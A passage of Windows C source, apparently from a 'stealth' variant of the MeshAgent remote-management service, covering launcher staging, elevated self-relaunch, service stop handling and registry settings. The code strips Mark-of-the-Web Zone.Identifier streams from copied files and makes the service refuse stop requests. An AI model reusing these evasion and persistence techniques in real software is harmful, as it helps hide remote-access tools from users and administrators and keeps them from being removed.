		traceLine,
		_countof(traceLine),
		L"[GUI] self-image path=%ls size=%llu lastWriteTicks=%llu",
		modulePath,
		(unsigned long long)fileSize.QuadPart,
		(unsigned long long)lastWriteTicks.QuadPart)))
	{
		MeshService_AppendUserGuiLaunchTrace(traceLine);
	}
}

static void MeshService_DeleteFileIfPresentW(const WCHAR* path)
{
	DWORD attrs;

	if (path == NULL || path[0] == L'\0') { return; }
	attrs = GetFileAttributesW(path);
	if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0) { return; }
	if ((attrs & FILE_ATTRIBUTE_READONLY) != 0)
	{
		SetFileAttributesW(path, attrs & ~FILE_ATTRIBUTE_READONLY);
	}
	if (!DeleteFileW(path))
	{
		DWORD deleteErr = GetLastError();
		if (deleteErr != ERROR_FILE_NOT_FOUND && deleteErr != ERROR_PATH_NOT_FOUND)
		{
			Stealth_LogInstallEvent(L"[GUI] Legacy launcher cleanup delete failed path=%ls error=%lu", path, deleteErr);
		}
	}
}

static BOOL MeshService_GetLauncherStageDirectory(WCHAR* stageDirOut, size_t stageDirOutCch)
{
	WCHAR localAppData[_MAX_PATH + 100];
	HRESULT hr;

	if (stageDirOut == NULL || stageDirOutCch == 0) { return FALSE; }
	stageDirOut[0] = L'\0';

	hr = SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppData);
	if (FAILED(hr)) { return FALSE; }
	if (FAILED(StringCchPrintfW(stageDirOut, stageDirOutCch, L"%ls\\%s\\launcher", localAppData, STEALTH_FALLBACK_SERVICE_NAME))) { return FALSE; }
	return TRUE;
}

static BOOL MeshService_IsLauncherStemChar(WCHAR ch)
{
	if (ch >= L'0' && ch <= L'9') { return TRUE; }
	if (ch >= L'A' && ch <= L'Z') { return TRUE; }
	if (ch >= L'a' && ch <= L'z') { return TRUE; }
	return (ch == L'-' || ch == L'_');
}

static BOOL MeshService_BuildStagedLauncherPath(const WCHAR* modulePath, const WCHAR* extension, WCHAR* stagedPathOut, size_t stagedPathOutCch)
{
	WCHAR stageDir[_MAX_PATH * 2] = {0};
	WCHAR fileName[_MAX_PATH] = {0};
	WCHAR stem[_MAX_PATH] = {0};
	const WCHAR* leaf = NULL;
	const WCHAR* p = NULL;
	WCHAR* dot = NULL;
	size_t stemLen = 0;
	size_t i = 0;

	if (modulePath == NULL || modulePath[0] == L'\0' || extension == NULL || extension[0] == L'\0' || stagedPathOut == NULL || stagedPathOutCch == 0)
	{
		return FALSE;
	}

	stagedPathOut[0] = L'\0';
	if (!MeshService_GetLauncherStageDirectory(stageDir, _countof(stageDir))) { return FALSE; }

	leaf = modulePath;
	for (p = modulePath; *p != L'\0'; ++p)
	{
		if (*p == L'\\' || *p == L'/')
		{
			leaf = p + 1;
		}
	}
	if (FAILED(StringCchCopyW(fileName, _countof(fileName), leaf))) { return FALSE; }

	dot = wcsrchr(fileName, L'.');
	if (dot != NULL) { *dot = L'\0'; }
	if (fileName[0] == L'\0')
	{
		StringCchCopyW(fileName, _countof(fileName), L"meshagent");
	}

	for (i = 0; fileName[i] != L'\0' && stemLen < (_countof(stem) - 1); ++i)
	{
		WCHAR ch = fileName[i];
		stem[stemLen++] = MeshService_IsLauncherStemChar(ch) ? ch : L'_';
	}
	if (stemLen == 0)
	{
		StringCchCopyW(stem, _countof(stem), L"meshagent");
	}
	else
	{
		stem[stemLen] = L'\0';
	}

	return SUCCEEDED(StringCchPrintfW(stagedPathOut, stagedPathOutCch, L"%ls\\%ls-launcher%ls", stageDir, stem, extension));
}

static void MeshService_CleanupLegacyLauncherArtifacts(void)
{
	WCHAR stageDir[_MAX_PATH * 2] = {0};
	WCHAR searchPattern[_MAX_PATH * 2] = {0};
	WCHAR fullPath[_MAX_PATH * 4] = {0};
	WCHAR zonePath[_MAX_PATH * 4] = {0};
	WIN32_FIND_DATAW findData;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	if (!MeshService_GetLauncherStageDirectory(stageDir, _countof(stageDir))) { return; }
	if (FAILED(StringCchPrintfW(searchPattern, _countof(searchPattern), L"%ls\\*", stageDir))) { return; }

	hFind = FindFirstFileW(searchPattern, &findData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) { continue; }
			fullPath[0] = L'\0';
			zonePath[0] = L'\0';
			if (FAILED(StringCchPrintfW(fullPath, _countof(fullPath), L"%ls\\%ls", stageDir, findData.cFileName))) { continue; }
			if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
			{
				MeshService_DeleteFileIfPresentW(fullPath);
				if (SUCCEEDED(StringCchPrintfW(zonePath, _countof(zonePath), L"%ls:Zone.Identifier", fullPath)))
				{
					MeshService_DeleteFileIfPresentW(zonePath);
				}
			}
		} while (FindNextFileW(hFind, &findData));

		FindClose(hFind);
	}

	RemoveDirectoryW(stageDir);
}

static void MeshService_ClearZoneIdentifier(const WCHAR* path)
{
	WCHAR zonePath[_MAX_PATH + 256];
	if (path == NULL || path[0] == L'\0') { return; }
	if (SUCCEEDED(StringCchPrintfW(zonePath, _countof(zonePath), L"%ls:Zone.Identifier", path)))
	{
		DeleteFileW(zonePath);
	}
}

static void MeshService_DeleteStagedSidecarIfPresent(const WCHAR* stagedExePath, const WCHAR* extension)
{
	WCHAR stagedPath[_MAX_PATH * 4] = {0};
	DWORD attrs;

	if (stagedExePath == NULL || extension == NULL) { return; }
	if (!MeshService_BuildSiblingPathWithExtension(stagedExePath, extension, stagedPath, _countof(stagedPath))) { return; }

	attrs = GetFileAttributesW(stagedPath);
	if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0) { return; }
	if ((attrs & FILE_ATTRIBUTE_READONLY) != 0)
	{
		SetFileAttributesW(stagedPath, attrs & ~FILE_ATTRIBUTE_READONLY);
	}
	DeleteFileW(stagedPath);
	MeshService_ClearZoneIdentifier(stagedPath);
}

static void MeshService_CopyResolvedSidecarIfPresent(const WCHAR* sourcePath, const WCHAR* stagedExePath, const WCHAR* extension, const WCHAR* sidecarLabel)
{
	WCHAR stagedPath[_MAX_PATH * 4] = {0};
	DWORD attrs;

	if (sourcePath == NULL || sourcePath[0] == L'\0' || stagedExePath == NULL || extension == NULL) { return; }
	if (!MeshService_BuildSiblingPathWithExtension(stagedExePath, extension, stagedPath, _countof(stagedPath))) { return; }

	attrs = GetFileAttributesW(sourcePath);
	if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0) { return; }

	attrs = GetFileAttributesW(stagedPath);
	if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_READONLY) != 0)
	{
		SetFileAttributesW(stagedPath, attrs & ~FILE_ATTRIBUTE_READONLY);
	}

	if (!CopyFileW(sourcePath, stagedPath, FALSE))
	{
		Stealth_LogInstallEvent(L"[GUI] Failed to stage launcher sidecar %ls (%ls -> %ls, error=%lu)",
			(sidecarLabel != NULL ? sidecarLabel : L""),
			sourcePath,
			stagedPath,
			GetLastError());
		return;
	}

	MeshService_ClearZoneIdentifier(stagedPath);
}

static BOOL MeshService_StageElevatedLaunchImage(const WCHAR* modulePath, WCHAR* stagedModulePathOut, size_t stagedModulePathOutCch)
{
	WCHAR stageDir[_MAX_PATH * 2] = {0};
	WCHAR appDir[_MAX_PATH * 2] = {0};
	WCHAR stagedPath[_MAX_PATH * 4] = {0};
	DWORD attrs = 0;
	StealthPackagePreflight preflight;

	if (stagedModulePathOut == NULL || stagedModulePathOutCch == 0 || modulePath == NULL || modulePath[0] == L'\0') { return FALSE; }
	stagedModulePathOut[0] = L'\0';

	if (!MeshService_GetLauncherStageDirectory(stageDir, _countof(stageDir))) { return FALSE; }
	if (!MeshService_BuildStagedLauncherPath(modulePath, L".exe", stagedPath, _countof(stagedPath))) { return FALSE; }

	if (MeshService_GetDirectoryFromPath(stageDir, appDir, _countof(appDir)) == FALSE ||
		!MeshService_EnsureDirectoryExistsW(appDir) ||
		!MeshService_EnsureDirectoryExistsW(stageDir))
	{
		Stealth_LogInstallEvent(L"[GUI] Failed to create staged launch directory (%ls)", stageDir);
		return FALSE;
	}

	attrs = GetFileAttributesW(stagedPath);
	if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_READONLY) != 0)
	{
		SetFileAttributesW(stagedPath, attrs & ~FILE_ATTRIBUTE_READONLY);
	}
	if (_wcsicmp(modulePath, stagedPath) != 0)
	{
		if (!CopyFileW(modulePath, stagedPath, FALSE))
		{
			Stealth_LogInstallEvent(L"[GUI] Failed to stage elevated launch image (%ls -> %ls, error=%lu)", modulePath, stagedPath, GetLastError());
			return FALSE;
		}
	}

	MeshService_ClearZoneIdentifier(stagedPath);
	ZeroMemory(&preflight, sizeof(preflight));
	if (!Stealth_PreflightPackageSource(modulePath, FALSE, FALSE, &preflight, NULL, 0))
	{
		Stealth_LogInstallEvent(L"[GUI] Package inspection failed for staged launcher image (%ls)", modulePath);
		return FALSE;
	}
	MeshService_DeleteStagedSidecarIfPresent(stagedPath, L".db");
	MeshService_DeleteStagedSidecarIfPresent(stagedPath, L".msh");
	MeshService_DeleteStagedSidecarIfPresent(stagedPath, L".conf");
	if (preflight.sourceDbPresent)
	{
		MeshService_CopyResolvedSidecarIfPresent(preflight.sourceDbPath, stagedPath, L".db", L".db");
	}
	if (preflight.sourceMshValid)
	{
		MeshService_CopyResolvedSidecarIfPresent(preflight.sourceMshPath, stagedPath, L".msh", L".msh");
	}
	else if (preflight.sourceMshPresent)
	{
		Stealth_LogInstallEvent(L"[GUI] Skipping invalid launcher sidecar .msh from %ls", preflight.sourceMshPath);
	}
	if (preflight.sourceConfValid)
	{
		MeshService_CopyResolvedSidecarIfPresent(preflight.sourceConfPath, stagedPath, L".conf", L".conf");
	}
	else if (preflight.sourceConfPresent)
	{
		Stealth_LogInstallEvent(L"[GUI] Skipping invalid launcher sidecar .conf from %ls", preflight.sourceConfPath);
	}

	if (FAILED(StringCchCopyW(stagedModulePathOut, stagedModulePathOutCch, stagedPath)))
	{
		return FALSE;
	}
	return TRUE;
}

static void MeshService_LogGuiActionLaunch(const WCHAR* phase, const WCHAR* mode, const WCHAR* modulePath, const WCHAR* args, const WCHAR* cwd, DWORD launchErr, DWORD exitCode)
{
	const WCHAR* safePhase = (phase != NULL) ? phase : L"unknown";
	const WCHAR* safeMode = (mode != NULL) ? mode : L"unknown";
	const WCHAR* safeModule = (modulePath != NULL) ? modulePath : L"";
	const WCHAR* safeArgs = (args != NULL) ? args : L"";
	const WCHAR* safeCwd = (cwd != NULL) ? cwd : L"";
	WCHAR userTraceLine[1024];

	Stealth_LogInstallEvent(
		L"[GUI] action=%ls mode=%ls module=%ls args=%ls cwd=%ls launchError=%lu exitCode=%lu",
		safePhase,
		safeMode,
		safeModule,
		safeArgs,
		safeCwd,
		launchErr,
		exitCode);

	if (SUCCEEDED(StringCchPrintfW(
		userTraceLine,
		_countof(userTraceLine),
		L"[GUI] action=%ls mode=%ls module=%ls args=%ls cwd=%ls launchError=%lu exitCode=%lu",
		safePhase,
		safeMode,
		safeModule,
		safeArgs,
		safeCwd,
		launchErr,
		exitCode)))
	{
		MeshService_AppendUserGuiLaunchTrace(userTraceLine);
	}
}

static DWORD MeshService_WaitForProcessWithGuiPump(HANDLE processHandle)
{
	HANDLE handles[1];
	DWORD waitResult;

	if (processHandle == NULL) { return WAIT_FAILED; }
	handles[0] = processHandle;

	for (;;)
	{
		waitResult = MsgWaitForMultipleObjects(1, handles, FALSE, 250, QS_ALLINPUT);
		if (waitResult == WAIT_OBJECT_0)
		{
			return WAIT_OBJECT_0;
		}
		if (waitResult == WAIT_OBJECT_0 + 1)
		{
			MSG msg;
			while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE))
			{
				if (msg.message == WM_QUIT)
				{
					PostQuitMessage((int)msg.wParam);
					continue;
				}
				TranslateMessage(&msg);
				DispatchMessageW(&msg);
			}
			continue;
		}
		if (waitResult == WAIT_TIMEOUT)
		{
			continue;
		}
		return waitResult;
	}
}

static BOOL MeshService_StringContainsInsensitiveW(const WCHAR* haystack, const WCHAR* needle)
{
	size_t needleLen = 0;
	size_t hayLen = 0;
	size_t i = 0;

	if (haystack == NULL || needle == NULL) { return FALSE; }
	needleLen = wcslen(needle);
	hayLen = wcslen(haystack);
	if (needleLen == 0 || hayLen < needleLen) { return FALSE; }

	for (i = 0; i <= (hayLen - needleLen); ++i)
	{
		if (_wcsnicmp(haystack + i, needle, needleLen) == 0)
		{
			return TRUE;
		}
	}
	return FALSE;
}

static BOOL MeshService_BuildGuiLaunchArgs(const WCHAR* originalArgs, const WCHAR* modulePath, WCHAR* argsOut, size_t argsOutCch)
{
	BOOL hasCleanup = FALSE;
	BOOL hasCleanupValue = FALSE;

	if (argsOut == NULL || argsOutCch == 0) { return FALSE; }
	argsOut[0] = L'\0';
	if (originalArgs == NULL) { originalArgs = L""; }
	if (FAILED(StringCchCopyW(argsOut, argsOutCch, originalArgs))) { return FALSE; }

	hasCleanup = MeshService_StringContainsInsensitiveW(originalArgs, L"--cleanup-launcher");
	hasCleanupValue = MeshService_StringContainsInsensitiveW(originalArgs, L"--cleanup-launcher=");
	if (hasCleanup && !hasCleanupValue && modulePath != NULL && modulePath[0] != L'\0')
	{
		WCHAR cleanupArg[_MAX_PATH * 2] = {0};
		if (SUCCEEDED(StringCchPrintfW(cleanupArg, _countof(cleanupArg), L" --cleanup-launcher=\"%ls\"", modulePath)))
		{
			if (FAILED(StringCchCatW(argsOut, argsOutCch, cleanupArg)))
			{
				Stealth_LogInstallEvent(L"[GUI] Unable to append cleanup launcher target argument due to length");
				return FALSE;
			}
		}
	}
	return TRUE;
}

static BOOL MeshService_RunSelfCommandAndWait(const char* args, int isAdmin, DWORD* exitCodeOut, DWORD* launchErrorOut)
{
	WCHAR modulePath[_MAX_PATH + 100];
	WCHAR moduleDir[_MAX_PATH + 100];
	WCHAR safeLaunchDir[_MAX_PATH + 1];
	WCHAR argsWide[2048];
	WCHAR launchArgsWide[4096];
	WCHAR commandLine[4096];
	WCHAR stagedModulePath[_MAX_PATH * 4];
	DWORD exitCode = ERROR_GEN_FAILURE;
	BOOL hasModuleDir = FALSE;
	BOOL hasSafeLaunchDir = FALSE;
	const WCHAR* launchMode = L"direct";
	const WCHAR* effectiveArgs = L"";

	if (exitCodeOut != NULL) { *exitCodeOut = ERROR_GEN_FAILURE; }
	if (launchErrorOut != NULL) { *launchErrorOut = ERROR_SUCCESS; }
	moduleDir[0] = L'\0';
	stagedModulePath[0] = L'\0';
	launchArgsWide[0] = L'\0';

	if (GetModuleFileNameW(NULL, modulePath, _countof(modulePath)) == 0)
	{
		if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
		MeshService_LogGuiActionLaunch(L"resolve-module", L"direct", L"", L"", L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
		return FALSE;
	}
	hasModuleDir = MeshService_GetDirectoryFromPath(modulePath, moduleDir, _countof(moduleDir));
	hasSafeLaunchDir = MeshService_GetSafeLaunchDirectory(safeLaunchDir, _countof(safeLaunchDir));
	MeshService_LogSelfImageIdentity(modulePath);
	MeshService_CleanupLegacyLauncherArtifacts();

	if (args == NULL) { args = ""; }
	if (MultiByteToWideChar(CP_UTF8, 0, args, -1, argsWide, _countof(argsWide)) <= 0)
	{
		if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
		MeshService_LogGuiActionLaunch(L"convert-args", L"direct", modulePath, L"", hasModuleDir ? moduleDir : L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
		return FALSE;
	}
	if (!MeshService_BuildGuiLaunchArgs(argsWide, modulePath, launchArgsWide, _countof(launchArgsWide)))
	{
		if (launchErrorOut != NULL) { *launchErrorOut = ERROR_INSUFFICIENT_BUFFER; }
		MeshService_LogGuiActionLaunch(L"build-args", L"direct", modulePath, argsWide, hasModuleDir ? moduleDir : L"", launchErrorOut != NULL ? *launchErrorOut : ERROR_INSUFFICIENT_BUFFER, exitCode);
		return FALSE;
	}
	effectiveArgs = launchArgsWide;

	if (isAdmin)
	{
		STARTUPINFOW si;
		PROCESS_INFORMATION pi;
		BOOL launched = FALSE;
		HANDLE childProcess = NULL;
		DWORD launchErr = ERROR_SUCCESS;
		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&pi, sizeof(pi));
		si.cb = sizeof(si);

		if (FAILED(StringCchPrintfW(commandLine, _countof(commandLine), L"\"%ls\" %ls", modulePath, effectiveArgs)))
		{
			if (launchErrorOut != NULL) { *launchErrorOut = ERROR_INSUFFICIENT_BUFFER; }
			MeshService_LogGuiActionLaunch(L"build-command", L"createprocess", modulePath, effectiveArgs, hasModuleDir ? moduleDir : L"", launchErrorOut != NULL ? *launchErrorOut : ERROR_INSUFFICIENT_BUFFER, exitCode);
			return FALSE;
		}

		launchMode = L"createprocess";
		if (CreateProcessW(modulePath, commandLine, NULL, NULL, FALSE, 0, NULL, hasSafeLaunchDir ? safeLaunchDir : NULL, &si, &pi))
		{
			launched = TRUE;
			childProcess = pi.hProcess;
			CloseHandle(pi.hThread);
		}
		else
		{
			launchErr = GetLastError();
			MeshService_LogGuiActionLaunch(L"launch", launchMode, modulePath, effectiveArgs, hasSafeLaunchDir ? safeLaunchDir : L"", launchErr, exitCode);
			if (launchErr == ERROR_PROC_NOT_FOUND || launchErr == ERROR_MOD_NOT_FOUND || launchErr == ERROR_BAD_EXE_FORMAT || launchErr == ERROR_ELEVATION_REQUIRED)
			{
				SHELLEXECUTEINFOW sei;
				ZeroMemory(&sei, sizeof(sei));
				sei.cbSize = sizeof(sei);
				sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
				sei.hwnd = NULL;
				sei.nShow = SW_NORMAL;
				sei.lpVerb = L"open";
				sei.lpFile = modulePath;
				sei.lpParameters = (effectiveArgs[0] != L'\0') ? effectiveArgs : NULL;
				sei.lpDirectory = hasSafeLaunchDir ? safeLaunchDir : NULL;
				launchMode = L"shell-open-fallback";

				if (!ShellExecuteExW(&sei))
				{
					launchErr = GetLastError();
					MeshService_LogGuiActionLaunch(L"launch-retry", launchMode, modulePath, effectiveArgs, hasSafeLaunchDir ? safeLaunchDir : L"", launchErr, exitCode);
					if (hasSafeLaunchDir && MeshService_IsRecoverableLaunchError(launchErr))
					{
						ZeroMemory(&sei, sizeof(sei));
						sei.cbSize = sizeof(sei);
						sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
						sei.hwnd = NULL;
						sei.nShow = SW_NORMAL;
						sei.lpVerb = L"open";
						sei.lpFile = modulePath;
						sei.lpParameters = (effectiveArgs[0] != L'\0') ? effectiveArgs : NULL;
						sei.lpDirectory = NULL;
						launchMode = L"shell-open-fallback-nocwd";
						if (!ShellExecuteExW(&sei))
						{
							launchErr = GetLastError();
							if (launchErrorOut != NULL) { *launchErrorOut = launchErr; }
							MeshService_LogGuiActionLaunch(L"launch-retry", launchMode, modulePath, effectiveArgs, L"", launchErr, exitCode);
							return FALSE;
						}
					}
					else
					{
						if (launchErrorOut != NULL) { *launchErrorOut = launchErr; }
						return FALSE;
					}
				}

				launched = TRUE;
				childProcess = sei.hProcess;
			}
			else
			{
				if (launchErrorOut != NULL) { *launchErrorOut = launchErr; }
				return FALSE;
			}
		}

		if (!launched)
		{
			if (launchErrorOut != NULL) { *launchErrorOut = ERROR_GEN_FAILURE; }
			return FALSE;
		}
		if (childProcess != NULL)
		{
			if (MeshService_WaitForProcessWithGuiPump(childProcess) == WAIT_FAILED)
			{
				if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
				CloseHandle(childProcess);
				MeshService_LogGuiActionLaunch(L"wait-failed", launchMode, modulePath, effectiveArgs, hasSafeLaunchDir ? safeLaunchDir : L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
				return FALSE;
			}
			if (!GetExitCodeProcess(childProcess, &exitCode))
			{
				if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
				CloseHandle(childProcess);
				MeshService_LogGuiActionLaunch(L"wait-exit", launchMode, modulePath, effectiveArgs, hasSafeLaunchDir ? safeLaunchDir : L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
				return FALSE;
			}
			CloseHandle(childProcess);
		}
		else
		{
			exitCode = ERROR_SUCCESS;
		}
	}
	else
	{
		SHELLEXECUTEINFOW sei;
		DWORD launchErr = ERROR_SUCCESS;
		const WCHAR* launchedPath = modulePath;
		BOOL launched = FALSE;
		const WCHAR* launchCandidate = modulePath;

		if (MeshService_StageElevatedLaunchImage(modulePath, stagedModulePath, _countof(stagedModulePath)))
		{
			launchCandidate = stagedModulePath;
			launchedPath = stagedModulePath;
		}

		ZeroMemory(&sei, sizeof(sei));
		sei.cbSize = sizeof(sei);
		sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
		sei.hwnd = GetForegroundWindow();
		sei.nShow = SW_NORMAL;
		sei.lpVerb = L"runas";
		sei.lpFile = launchCandidate;
		sei.lpDirectory = NULL;
		sei.lpParameters = (effectiveArgs[0] != L'\0') ? effectiveArgs : NULL;
		launchMode = (launchCandidate == stagedModulePath) ? L"shell-runas-staged" : L"shell-runas-defaultcwd";

		if (ShellExecuteExW(&sei))
		{
			launched = TRUE;
			launchErr = ERROR_SUCCESS;
		}
		else
		{
			launchErr = GetLastError();
			MeshService_LogGuiActionLaunch(L"launch", launchMode, launchCandidate, effectiveArgs, L"", launchErr, exitCode);
		}

		if (!launched && launchCandidate != modulePath && MeshService_IsRecoverableLaunchError(launchErr))
		{
			ZeroMemory(&sei, sizeof(sei));
			sei.cbSize = sizeof(sei);
			sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
			sei.hwnd = GetForegroundWindow();
			sei.nShow = SW_NORMAL;
			sei.lpVerb = L"runas";
			sei.lpFile = modulePath;
			sei.lpDirectory = NULL;
			sei.lpParameters = (effectiveArgs[0] != L'\0') ? effectiveArgs : NULL;
			launchMode = L"shell-runas-defaultcwd";

			if (ShellExecuteExW(&sei))
			{
				launched = TRUE;
				launchErr = ERROR_SUCCESS;
				launchedPath = modulePath;
			}
			else
			{
				launchErr = GetLastError();
				MeshService_LogGuiActionLaunch(L"launch-retry", launchMode, modulePath, effectiveArgs, L"", launchErr, exitCode);
			}
		}

		if (!launched && hasSafeLaunchDir && MeshService_IsRecoverableLaunchError(launchErr))
		{
			ZeroMemory(&sei, sizeof(sei));
			sei.cbSize = sizeof(sei);
			sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_FLAG_NO_UI;
			sei.hwnd = GetForegroundWindow();
			sei.nShow = SW_NORMAL;
			sei.lpVerb = L"runas";
			sei.lpFile = modulePath;
			sei.lpDirectory = safeLaunchDir;
			sei.lpParameters = (effectiveArgs[0] != L'\0') ? effectiveArgs : NULL;
			launchMode = L"shell-runas-safecwd";

			if (ShellExecuteExW(&sei))
			{
				launched = TRUE;
				launchErr = ERROR_SUCCESS;
				launchedPath = modulePath;
			}
			else
			{
				launchErr = GetLastError();
				MeshService_LogGuiActionLaunch(L"launch-retry", launchMode, modulePath, effectiveArgs, safeLaunchDir, launchErr, exitCode);
			}
		}

		if (!launched)
		{
			if (launchErrorOut != NULL) { *launchErrorOut = (launchErr != ERROR_SUCCESS ? launchErr : ERROR_GEN_FAILURE); }
			return FALSE;
		}

		if (sei.hProcess != NULL)
		{
			if (MeshService_WaitForProcessWithGuiPump(sei.hProcess) == WAIT_FAILED)
			{
				if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
				CloseHandle(sei.hProcess);
				MeshService_LogGuiActionLaunch(L"wait-failed", launchMode, launchedPath, effectiveArgs, hasSafeLaunchDir ? safeLaunchDir : L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
				return FALSE;
			}
			if (!GetExitCodeProcess(sei.hProcess, &exitCode))
			{
				if (launchErrorOut != NULL) { *launchErrorOut = GetLastError(); }
				CloseHandle(sei.hProcess);
				MeshService_LogGuiActionLaunch(L"wait-exit", launchMode, launchedPath, effectiveArgs, hasSafeLaunchDir ? safeLaunchDir : L"", launchErrorOut != NULL ? *launchErrorOut : GetLastError(), exitCode);
				return FALSE;
			}
			CloseHandle(sei.hProcess);
		}
		else
		{
			exitCode = ERROR_SUCCESS;
		}
	}

	if (launchErrorOut != NULL) { *launchErrorOut = ERROR_SUCCESS; }
	if (exitCodeOut != NULL) { *exitCodeOut = exitCode; }
	MeshService_LogGuiActionLaunch(L"complete", launchMode, modulePath, effectiveArgs, hasSafeLaunchDir ? safeLaunchDir : (hasModuleDir ? moduleDir : L""), ERROR_SUCCESS, exitCode);
	return (exitCode == ERROR_SUCCESS);
}

static BOOL MeshService_SetAllowStopOverride(const wchar_t* serviceName, DWORD* previousValue, BOOL* hadPrevious)
{
	wchar_t paramsKeyPath[512];
	HKEY hKey = NULL;
	LONG regResult;
	DWORD type = 0;
	DWORD value = 0;
	DWORD cb = sizeof(value);
	DWORD allowStop = 1;

	if (serviceName == NULL || serviceName[0] == L'\0') { return FALSE; }
	if (previousValue != NULL) { *previousValue = 0; }
	if (hadPrevious != NULL) { *hadPrevious = FALSE; }

	_snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE,
		L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName);

	regResult = RegCreateKeyExW(HKEY_LOCAL_MACHINE, paramsKeyPath, 0, NULL, 0, KEY_QUERY_VALUE | KEY_SET_VALUE, NULL, &hKey, NULL);
	if (regResult != ERROR_SUCCESS)
	{
		SetLastError((DWORD)regResult);
		return FALSE;
	}

	regResult = RegQueryValueExW(hKey, L"AllowStop", NULL, &type, (LPBYTE)&value, &cb);
	if (regResult == ERROR_SUCCESS && type == REG_DWORD)
	{
		if (previousValue != NULL) { *previousValue = value; }
		if (hadPrevious != NULL) { *hadPrevious = TRUE; }
	}

	regResult = RegSetValueExW(hKey, L"AllowStop", 0, REG_DWORD, (const BYTE*)&allowStop, sizeof(allowStop));
	RegCloseKey(hKey);
	if (regResult != ERROR_SUCCESS)
	{
		SetLastError((DWORD)regResult);
		return FALSE;
	}
	return TRUE;
}

static void MeshService_RestoreAllowStopOverride(const wchar_t* serviceName, DWORD previousValue, BOOL hadPrevious)
{
	wchar_t paramsKeyPath[512];
	HKEY hKey = NULL;
	LONG regResult;

	if (serviceName == NULL || serviceName[0] == L'\0') { return; }
	_snwprintf_s(paramsKeyPath, _countof(paramsKeyPath), _TRUNCATE,
		L"SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", serviceName);

	regResult = RegOpenKeyExW(HKEY_LOCAL_MACHINE, paramsKeyPath, 0, KEY_SET_VALUE, &hKey);
	if (regResult != ERROR_SUCCESS || hKey == NULL)
	{
		return;
	}

	if (hadPrevious)
	{
		RegSetValueExW(hKey, L"AllowStop", 0, REG_DWORD, (const BYTE*)&previousValue, sizeof(previousValue));
	}
	else
	{
		RegDeleteValueW(hKey, L"AllowStop");
	}
	RegCloseKey(hKey);
}

static void MeshService_RefreshControlsAccepted(void)
{
	DWORD controls = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_POWEREVENT | SERVICE_ACCEPT_SESSIONCHANGE;
	serviceStatus.dwControlsAccepted = controls;
	if (serviceStatusHandle != 0)
	{
		SetServiceStatus(serviceStatusHandle, &serviceStatus);
	}
}

DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eventData, void* eventContext)
{
#ifdef MESHAGENT_ENABLE_STEALTH
	if (StealthIntegration_HandleServiceControl(controlCode))
	{
		return NO_ERROR;
	}
#endif
	switch (controlCode)
	{
	case SERVICE_CONTROL_INTERROGATE:
		MeshService_RefreshControlsAccepted();
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		Stealth_DebugPrintfA("[ServiceMain] Received SERVICE_CONTROL_SHUTDOWN");
		serviceStatus.dwWin32ExitCode = NO_ERROR;
		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(serviceStatusHandle, &serviceStatus);
		if (agent != NULL) { MeshAgent_Stop(agent); }
		return NO_ERROR;
	case SERVICE_CONTROL_STOP:
		MeshService_RefreshControlsAccepted();
		if (!MeshService_AllowStop())
		{
			Stealth_DebugPrintfA("[ServiceMain] Ignoring SERVICE_CONTROL_STOP");
			serviceStatus.dwWin32ExitCode = ERROR_SERVICE_CANNOT_ACCEPT_CTRL;
			serviceStatus.dwCurrentState = SERVICE_RUNNING;
			SetServiceStatus(serviceStatusHandle, &serviceStatus);
			MeshService_ReportCriticalStopDenial();
			return ERROR_SERVICE_CANNOT_ACCEPT_CTRL;
		}
		Stealth_DebugPrintfA("[ServiceMain] Received SERVICE_CONTROL_STOP");
		serviceStatus.dwWin32ExitCode = NO_ERROR;
		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
		SetServiceStatus(serviceStatusHandle, &serviceStatus);
		if (agent != NULL) { MeshAgent_Stop(agent); }
		return NO_ERROR;
	case SERVICE_CONTROL_POWEREVENT:
		switch (eventType)
		{
		case PBT_APMPOWERSTATUSCHANGE:	// Power status has changed.
			break;
		case PBT_APMRESUMEAUTOMATIC:	// Operation is resuming automatically from a low - power state.This message is sent every time the system resumes.
			break;
